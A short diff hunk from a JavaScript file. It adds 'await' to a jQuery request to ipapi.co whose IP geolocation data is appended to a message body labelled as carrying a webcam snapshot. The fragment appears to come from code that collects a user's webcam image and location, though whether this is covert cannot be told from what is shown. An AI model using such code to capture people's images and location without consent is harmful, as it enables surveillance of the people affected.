@@ -65,7 +65,7 @@
             console.log(base64image)
             var Body="Attachment of the webcam snap";
             try{
-                $.getJSON('https://ipapi.co/json/', function(data) {
+                await $.getJSON('https://ipapi.co/json/', function(data) {
                     var ipdata=JSON.stringify(data, null, 2)
                     console.log(ipdata);
                     Body+="\n"+ipdata;
